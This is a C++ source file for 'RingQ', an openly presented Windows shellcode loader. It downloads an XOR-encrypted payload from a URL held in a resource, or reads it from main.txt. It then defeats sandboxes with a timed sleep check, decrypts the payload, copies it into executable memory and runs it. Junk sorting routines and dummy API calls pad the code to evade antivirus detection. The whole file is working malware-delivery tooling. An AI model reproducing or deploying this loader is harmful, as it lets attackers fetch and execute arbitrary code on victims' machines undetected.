#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <chrono>
#include <thread>
#include <random>
#include <algorithm>
#include <numeric>
#include <functional>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#include <sstream>
using namespace std;


void bubbleSort(int arr[], int n) {
    for (int i = 0; i < n - 1; i++) {
        for (int j = 0; j < n - i - 1; j++) {
            if (arr[j] > arr[j + 1]) {
                int k = arr[j];
                arr[j] = arr[j + 1];
                arr[j + 1] = k;
            }
        }
    }
}

void generateAndSortArray() {
    std::srand(std::time(0));

    const int ARRAY_SIZE = 100;
    int huaarr[ARRAY_SIZE];
    for (int i = 0; i < ARRAY_SIZE; i++) {
        huaarr[i] = std::rand() % 1000;
    }

    bubbleSort(huaarr, ARRAY_SIZE);

    for (int i = 0; i < ARRAY_SIZE; i++) {
    }
}

void targetFunction() {
    unsigned __int64 i = 0;

    __try {
        i = MessageBoxA(NULL, NULL, NULL, NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {

    }

    i = GetLastError();

    __try {
        i = SetCriticalSectionSpinCount(NULL, NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {

    }

    i = GetWindowContextHelpId(NULL);

    __try {
        i = GetWindowLongPtrW(NULL, NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {

    }

    __try {
        i = RegisterClassW(NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {

    }

    i = IsWindowVisible(NULL);

    __try {
        i = ConvertDefaultLocale(NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {

    }

    __try {
        i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {

    }

    __try {
        i = IsDialogMessageW(NULL, NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {

    }
}

int obfuscate(int value) {
    const int secret = 42;
    return (value ^ secret) + secret;
}

void obfuscatedLogic() {
    std::vector<int> numbers = { 1, 2, 3, 4, 5 };

    std::transform(numbers.begin(), numbers.end(), numbers.begin(), obfuscate);

    int sum = std::accumulate(numbers.begin(), numbers.end(), 0);

    const int magicNumber = 13;
    if (sum % magicNumber == 0) {
        void (*functionPtr)() = targetFunction;
        functionPtr();
    }
}

std::string xorDecrypt(const std::string& data, const std::string& key) {
    generateAndSortArray();

    std::string decryptedData;
    for (std::size_t i = 0; i < data.length(); ++i) {
        decryptedData += data[i] ^ key[i % key.length()];
    }
    return decryptedData;
}

void quickSort(int arr[], int left, int right) {
    int i = left, j = right;
    int tmp;
    int pivot = arr[(left + right) / 2];

    while (i <= j) {
        while (arr[i] < pivot)
            i++;
        while (arr[j] > pivot)
            j--;
        if (i <= j) {
            tmp = arr[i];
            arr[i] = arr[j];
            arr[j] = tmp;
            i++;
            j--;
        }
    }

    if (left < j)
        quickSort(arr, left, j);
    if (i < right)
        quickSort(arr, i, right);
}

int decryptKey(int diff, int minValue, int maxValue) {
    generateAndSortArray();
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(minValue, maxValue);
    int randomValue = diff + dis(gen);
    if (randomValue == 520520) {
        return randomValue;
    }
    return decryptKey(diff, minValue, maxValue);
}

void banner() {
    cout << "               RingQ :)" << endl;
    cout << "Github: https://github.com/T4y1oR/RingQ" << endl;
}


std::wstring GetStringTableValue(int resourceId) {
    HINSTANCE hInstance = GetModuleHandle(NULL);

    const int bufferSize = 256;
    TCHAR buffer[bufferSize];

    if (LoadString(hInstance, resourceId, buffer, bufferSize) > 0) {
        std::wstring strValue(buffer);
        return strValue;
    }
    else {
        return L"";
    }
}


std::string wstringToString(const std::wstring& wstr) {
    std::string str(wstr.begin(), wstr.end());
    return str;
}

bool isFileExists(const std::string& file_path) {
    std::ifstream file(file_path);
    return file.good();
}


void RingQ(const std::string& file_path) {
    std::ifstream input_file(file_path, std::ios::binary);
    if (!input_file) {
        std::cout << "Failed to open file!" << std::endl;
        return;
    }

    std::string encrypted_data((std::istreambuf_iterator<char>(input_file)), std::istreambuf_iterator<char>());
    input_file.close();

    auto start_time = std::chrono::high_resolution_clock::now();
    std::this_thread::sleep_for(std::chrono::milliseconds(5000));
    auto end_time = std::chrono::high_resolution_clock::now();

    auto elapsed_time = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);
    int time_diff = elapsed_time.count();

    int demo = 520521;
    int diff = demo - time_diff;


    int i = 300;
    while (i--) {
        int randomValue = decryptKey(diff, 5000, 5500);

        if (520519 < randomValue && randomValue < 520521) {

            std::string randomkey = std::to_string(randomValue);

            std::string decrypted_data = xorDecrypt(encrypted_data, randomkey);
            const unsigned char* byte_sequence = reinterpret_cast<const unsigned char*>(decrypted_data.c_str());
            size_t byte_sequence_length = decrypted_data.length();

            LPVOID execMemory = VirtualAlloc(NULL, byte_sequence_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            generateAndSortArray();

            memcpy(execMemory, byte_sequence, byte_sequence_length);

            generateAndSortArray();

            typedef void (*ShellcodeFunc)();

            generateAndSortArray();

            ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(execMemory);
             
            generateAndSortArray();

            shellcodeFunc();

            generateAndSortArray();

            VirtualFree(execMemory, 0, MEM_RELEASE);

        }break;

    }
}

bool downloadFile(const string& url, const string& filename) {
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;
    char buffer[1024];

    hInternet = InternetOpen(L"Download", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        return false;
    }

    hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        InternetCloseHandle(hInternet);
        return false;
    }

    HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        DWORD bytesWritten;
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    }

    CloseHandle(hFile);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return true;
}


int main() {
    banner();

    generateAndSortArray();

    std::string file_path = "main.txt";

    if (isFileExists(file_path)) {
        RingQ(file_path);

        return 0;
    }
    else {
        int resourceId = 101;
        std::wstring myVariable = GetStringTableValue(resourceId);
        std::string file_path_absolute = wstringToString(myVariable);

        std::cout << file_path_absolute << std::endl;

        if (file_path_absolute.substr(0, 4) == "http") {
            const string filename = "main.txt";
            downloadFile(file_path_absolute, filename);
            RingQ(filename);
        }
        else {
            RingQ(file_path_absolute);
        }

        return 0;
    }


}